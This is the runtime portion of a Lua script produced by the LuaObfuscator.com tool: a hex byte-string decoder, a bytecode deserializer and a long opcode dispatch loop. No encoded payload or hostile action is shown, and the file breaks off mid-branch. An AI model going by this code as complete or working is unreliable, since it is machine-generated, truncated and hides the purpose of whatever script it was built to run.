--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 81) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 46) then
					if (Enum <= 22) then
						if (Enum <= 10) then
							if (Enum <= 4) then
								if (Enum <= 1) then
									if (Enum == 0) then
										Stk[Inst[2]] = {};
									else
										local A = Inst[2];
										local T = Stk[A];
										local B = Inst[3];
										for Idx = 1, B do
											T[Idx] = Stk[A + Idx];
										end
									end
								elseif (Enum <= 2) then
									local A;
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									do
										return;
									end
								elseif (Enum > 3) then
									Stk[Inst[2]][Inst[3]] = Inst[4];
								else
									VIP = Inst[3];
								end
							elseif (Enum <= 7) then
								if (Enum <= 5) then
									local A = Inst[2];
									Stk[A](Unpack(Stk, A + 1, Top));
								elseif (Enum > 6) then
									if (Stk[Inst[2]] ~= Inst[4]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									Env[Inst[3]] = Stk[Inst[2]];
								end
							elseif (Enum <= 8) then
								local A;
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
							elseif (Enum > 9) then
								local B = Stk[Inst[4]];
								if B then
									VIP = VIP + 1;
								else
									Stk[Inst[2]] = B;
									VIP = Inst[3];
								end
							else
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
							end
						elseif (Enum <= 16) then
							if (Enum <= 13) then
								if (Enum <= 11) then
									local Edx;
									local Results, Limit;
									local B;
									local A;
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results, Limit = _R(Stk[A](Stk[A + 1]));
									Top = (Limit + A) - 1;
									Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Upvalues[Inst[3]] = Stk[Inst[2]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									do
										return;
									end
								elseif (Enum == 12) then
									local B = Stk[Inst[4]];
									if not B then
										VIP = VIP + 1;
									else
										Stk[Inst[2]] = B;
										VIP = Inst[3];
									end
								else
									local A = Inst[2];
									local Results, Limit = _R(Stk[A]());
									Top = (Limit + A) - 1;
									local Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								end
							elseif (Enum <= 14) then
								local Edx;
								local Limit;
								local Results;
								local A;
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A]();
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Results = {Stk[A]()};
								Limit = Inst[4];
								Edx = 0;
								for Idx = A, Limit do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A]();
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A]();
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							elseif (Enum == 15) then
								local A;
								local K;
								local B;
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								B = Inst[3];
								K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return Stk[Inst[2]];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum <= 19) then
							if (Enum <= 17) then
								Stk[Inst[2]] = Upvalues[Inst[3]];
							elseif (Enum > 18) then
								Stk[Inst[2]] = Stk[Inst[3]];
							elseif Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 20) then
							Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
						elseif (Enum == 21) then
							Stk[Inst[2]]();
						else
							local A;
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						end
					elseif (Enum <= 34) then
						if (Enum <= 28) then
							if (Enum <= 25) then
								if (Enum <= 23) then
									local Edx;
									local Results;
									local A;
									A = Inst[2];
									Stk[A] = Stk[A]();
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A]();
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results = {Stk[A](Stk[A + 1])};
									Edx = 0;
									for Idx = A, Inst[4] do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									VIP = Inst[3];
								elseif (Enum == 24) then
									local Edx;
									local Results, Limit;
									local B;
									local A;
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results, Limit = _R(Stk[A](Stk[A + 1]));
									Top = (Limit + A) - 1;
									Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									do
										return Stk[A](Unpack(Stk, A + 1, Top));
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									do
										return Unpack(Stk, A, Top);
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									do
										return;
									end
								else
									local A;
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									do
										return;
									end
								end
							elseif (Enum <= 26) then
								local A;
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A]();
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum > 27) then
								local Edx;
								local Results, Limit;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Results, Limit = _R(Stk[A]());
								Top = (Limit + A) - 1;
								Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
							elseif (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 31) then
							if (Enum <= 29) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Top));
								end
							elseif (Enum > 30) then
								local A = Inst[2];
								do
									return Stk[A], Stk[A + 1];
								end
							else
								local Edx;
								local Results;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3] ~= 0;
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
								Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 32) then
							local K;
							local B;
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							VIP = Inst[3];
						elseif (Enum == 33) then
							local Edx;
							local Results, Limit;
							local B;
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Top));
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						else
							local K;
							local B;
							local A;
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 40) then
						if (Enum <= 37) then
							if (Enum <= 35) then
								local A = Inst[2];
								local Results = {Stk[A]()};
								local Limit = Inst[4];
								local Edx = 0;
								for Idx = A, Limit do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 36) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							else
								Stk[Inst[2]] = Inst[3];
							end
						elseif (Enum <= 38) then
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3] ~= 0;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return Stk[Inst[2]];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						elseif (Enum == 39) then
							local K;
							local B;
							local A;
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return Stk[Inst[2]];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						else
							local B;
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						end
					elseif (Enum <= 43) then
						if (Enum <= 41) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						elseif (Enum == 42) then
							local K;
							local B;
							local A;
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
